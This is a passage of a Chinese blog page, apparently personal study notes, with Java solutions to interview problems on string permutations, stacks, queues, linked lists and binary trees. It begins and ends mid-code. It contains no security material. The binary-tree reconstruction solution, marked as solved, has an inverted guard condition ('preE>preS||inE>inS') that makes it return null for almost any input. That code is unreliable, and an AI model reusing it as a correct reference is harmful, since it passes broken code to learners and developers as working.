<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="字符串的排列-">字符串的排列 -</span></h2><p>输入一个字符串,按字典序打印出该字符串中字符的所有排列。例如输入字符串abc,则打印出由字符a,b,c所能排列出来的所有字符串abc,acb,bac,bca,cab和cba。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;String&gt; <span class="title">Permutation</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">       ArrayList&lt;String&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">if</span>(str==<span class="keyword">null</span>||str.length()==<span class="number">0</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">return</span> back(str,res,<span class="keyword">new</span> StringBuilder(),<span class="keyword">new</span> <span class="keyword">boolean</span>[str.length()]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;String&gt; <span class="title">back</span><span class="params">(String str,ArrayList&lt;String&gt; res,StringBuilder sb,<span class="keyword">boolean</span>[] memo)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sb.length()==str.length())&#123;</span><br><span class="line">            res.add(sb.toString());</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>&amp;&amp;!memo[i-<span class="number">1</span>]&amp;&amp;str.charAt(i)==str.charAt(i-<span class="number">1</span>)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(memo[i]==<span class="keyword">false</span>)&#123;</span><br><span class="line">                memo[i]=<span class="keyword">true</span>;</span><br><span class="line">                sb.append(str.charAt(i));</span><br><span class="line">                back(str,res,sb,memo);</span><br><span class="line">                sb.deleteCharAt(sb.length()-<span class="number">1</span>);</span><br><span class="line">                memo[i]=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>记住deleteCharAt</p><h1><span id="栈和队列">栈和队列</span></h1><h2><span id="字符流中第一个不重复的字符">字符流中第一个不重复的字符 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Insert one char from stringstream</span></span><br><span class="line">    Map&lt;Character,Integer&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Queue&lt;Character&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Insert</span><span class="params">(<span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(ch)) map.put(ch,<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            map.put(ch,<span class="number">1</span>);</span><br><span class="line">            q.offer(ch);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//return the first appearence once char in current stringstream</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">FirstAppearingOnce</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">char</span> c=q.peek();</span><br><span class="line">            <span class="keyword">if</span>(map.get(c)==<span class="number">1</span>)<span class="keyword">return</span> c;</span><br><span class="line">            <span class="keyword">else</span> q.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'#'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="从尾到头打印链表">从尾到头打印链表 √</span></h2><p>输入一个链表，按链表从尾到头的顺序返回一个ArrayList。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">printListFromTailToHead</span><span class="params">(ListNode listNode)</span> </span>&#123;</span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (listNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">        stack.add(listNode.val);</span><br><span class="line">        listNode = listNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">    ArrayList&lt;Integer&gt; ret = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty())</span><br><span class="line">        ret.add(stack.pop());</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="包含min函数的栈">包含min函数的栈 √</span></h2><p>定义栈的数据结构，请在该类型中实现一个能够得到栈中所含最小元素的min函数（时间复杂度应为O（1））。</p><p>注意：保证测试中不会当栈为空的时候，对栈调用pop()或者min()或者top()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Stack&lt;Integer&gt; ele=<span class="keyword">new</span> Stack();</span><br><span class="line">    Stack&lt;Integer&gt; min=<span class="keyword">new</span> Stack();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(min.size()==<span class="number">0</span>||node&lt;=min.peek()) min.push(node);</span><br><span class="line">        ele.push(node);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ele.peek()==min.peek()) min.pop();</span><br><span class="line">        ele.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ele.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> min.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="栈的压入弹出序列">栈的压入弹出序列 √</span></h2><p>输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列1,2,3,4,5是某栈的压入顺序，序列4,5,3,2,1是该压栈序列对应的一个弹出序列，但4,3,5,1,2就不可能是该压栈序列的弹出序列。（注意：这两个序列的长度是相等的）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">IsPopOrder</span><span class="params">(<span class="keyword">int</span> [] pushA,<span class="keyword">int</span> [] popA)</span> </span>&#123;</span><br><span class="line">    Stack&lt;Integer&gt; s = <span class="keyword">new</span> Stack();</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;pushA.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pushA[i]!=popA[j])&#123;</span><br><span class="line">            s.push(pushA[i]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!s.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.pop()==popA[j]) j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j==popA.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="链表">链表</span></h1><h2><span id="链表中环的入口结点">链表中环的入口结点 √</span></h2><p>给一个链表，若其中包含环，请找出该链表的环的入口结点，否则，输出null。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">EntryNodeOfLoop</span><span class="params">(ListNode pHead)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(pHead==<span class="keyword">null</span>||pHead.next==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        ListNode fast=pHead;</span><br><span class="line">        ListNode slow=pHead;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            fast=fast.next.next;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">            <span class="keyword">if</span>(fast==slow)&#123;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;           </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">while</span>(pHead!=fast)&#123;                    </span><br><span class="line">                    pHead=pHead.next;</span><br><span class="line">                    fast=fast.next;</span><br><span class="line">                    <span class="keyword">if</span>(fast==pHead)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> pHead;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="删除链表中重复的结点-">删除链表中重复的结点 -</span></h2><p>在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留，返回链表头指针。 例如，链表1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 处理后为 1-&gt;2-&gt;5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplication</span><span class="params">(ListNode pHead)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       ListNode head = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">       head.next=pHead;</span><br><span class="line">       ListNode pre=head,now=pHead;</span><br><span class="line">       <span class="keyword">while</span>(now!=<span class="keyword">null</span>&amp;&amp;now.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(now.next.val==now.val)&#123;</span><br><span class="line">               <span class="keyword">while</span>(now.next!=<span class="keyword">null</span>&amp;&amp;now.next.val==now.val)&#123;</span><br><span class="line">                   now=now.next;</span><br><span class="line">               &#125;</span><br><span class="line">              now=now.next;</span><br><span class="line">               pre.next=now;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               pre=pre.next;</span><br><span class="line">               now=now.next;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> head.next;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果是不删除重复节点的话，将now=now.next注释就可以了。</p><h2><span id="合并两个排序的链表">合并两个排序的链表 √</span></h2><p>输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">Merge</span><span class="params">(ListNode list1,ListNode list2)</span> </span>&#123;</span><br><span class="line">        ListNode root = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode now=root;</span><br><span class="line">        <span class="keyword">while</span>(list1!=<span class="keyword">null</span>&amp;&amp;list2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(list1.val&lt;=list2.val)&#123;</span><br><span class="line">                now.next=list1;</span><br><span class="line">                list1=list1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                now.next=list2;</span><br><span class="line">                list2=list2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            now=now.next;</span><br><span class="line">        &#125;</span><br><span class="line">        now.next= list1==<span class="keyword">null</span>?list2:list1;</span><br><span class="line">        <span class="keyword">return</span> root.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="链表中倒数第k个结点">链表中倒数第k个结点 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">FindKthToTail</span><span class="params">(ListNode head,<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        ListNode root=head;      </span><br><span class="line">        <span class="keyword">while</span>(k--&gt;<span class="number">0</span>&amp;&amp;root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            root=root.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;=<span class="number">0</span>)<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            root=root.next;</span><br><span class="line">            head=head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="反转链表">反转链表 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">ReverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode root=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            ListNode tmp = head.next;</span><br><span class="line">            head.next=root.next;</span><br><span class="line">            root.next=head;</span><br><span class="line">            head=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="复杂链表的复制">复杂链表的复制 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> RandomListNode <span class="title">Clone</span><span class="params">(RandomListNode pHead)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        RandomListNode head=pHead;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;          </span><br><span class="line">            RandomListNode tmp=<span class="keyword">new</span> RandomListNode(head.label);            </span><br><span class="line">            tmp.next=head.next;</span><br><span class="line">            head.next=tmp;</span><br><span class="line">            head=tmp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        head=pHead;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head.random!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                RandomListNode ran=head.random;</span><br><span class="line">                head.next.random=ran.next;</span><br><span class="line">            &#125;</span><br><span class="line">            head=head.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        head=pHead;</span><br><span class="line">        RandomListNode res=head.next;</span><br><span class="line">        <span class="keyword">while</span>(head.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            RandomListNode next=head.next;</span><br><span class="line">            head.next=head.next.next;</span><br><span class="line">            head=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="树">树</span></h1><h2><span id="重建二叉树">重建二叉树 √</span></h2><p>输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span>[] inorder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> build(preorder,<span class="number">0</span>,preorder.length-<span class="number">1</span>,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> TreeNode <span class="title">build</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span> preS, <span class="keyword">int</span> preE, <span class="keyword">int</span>[] inorder, <span class="keyword">int</span> inS, <span class="keyword">int</span> inE)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preE&gt;preS||inE&gt;inS) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    TreeNode root=<span class="keyword">new</span> TreeNode(preorder[preS]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = inS; i &lt;=inE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder[i]==preorder[preS])&#123;</span><br><span class="line">            root.left=build(preorder,preS+<span class="number">1</span>,preS+i-inS,inorder,inS,i-<span class="number">1</span>);</span><br><span class="line">            root.right=build(preorder,preS+i-inS+<span class="number">1</span>,preE,inorder,i+<span class="number">1</span>,inE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="二叉树的镜象">二叉树的镜象 √</span></h2><p>操作给定的二叉树，将其变换为源二叉树的镜像。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">二叉树的镜像定义：源二叉树 </span><br><span class="line">        8</span><br><span class="line">       &#x2F;  \</span><br><span class="line">      6   10</span><br><span class="line">     &#x2F; \  &#x2F; \</span><br><span class="line">    5  7 9 11</span><br><span class="line">    镜像二叉树</span><br><span class="line">        8</span><br><span class="line">       &#x2F;  \</span><br><span class="line">      10   6</span><br><span class="line">     &#x2F; \  &#x2F; \</span><br><span class="line">    11 9 7  5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Mirror</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    swap(root);</span><br><span class="line">    Mirror(root.left);</span><br><span class="line">    Mirror(root.right);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    TreeNode t = root.left;</span><br><span class="line">    root.left = root.right;</span><br><span class="line">    root.right = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="从上到下打印二叉树">从上到下打印二叉树 √</span></h2><p>从上往下打印出二叉树的每个节点，同层节点从左至右打印</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">PrintFromTopToBottom</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    q.offer(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        TreeNode tmp=q.poll();</span><br><span class="line">        res.add(tmp.val);</span><br><span class="line">        <span class="keyword">if</span>(tmp.left!=<span class="keyword">null</span>) q.offer(tmp.left);</span><br><span class="line">        <span class="keyword">if</span>(tmp.right!=<span class="keyword">null</span>) q.offer(tmp.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="按之字形顺序打印二叉树">按之字形顺序打印二叉树 √</span></h2><p>请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt; &gt; Print(TreeNode pRoot) &#123;</span><br><span class="line">    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">if</span>(pRoot==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    q.add(pRoot);</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> len = q.size();</span><br><span class="line">        ArrayList&lt;Integer&gt; memo = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            TreeNode tmp = q.poll();</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">1</span>) memo.add(tmp.val);</span><br><span class="line">            <span class="keyword">else</span> memo.add(<span class="number">0</span>,tmp.val);</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="keyword">null</span>) q.offer(tmp.left);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="keyword">null</span>) q.offer(tmp.right);</span><br><span class="line">        &#125;</span><br><span class="line">        flag=flag*-<span class="number">1</span>;</span><br><span class="line">        res.add(memo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="对称的二叉树">对称的二叉树 √</span></h2><p>请实现一个函数，用来判断一颗二叉树是不是对称的。注意，如果一个二叉树同此二叉树的镜像是同样的，定义其为对称的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 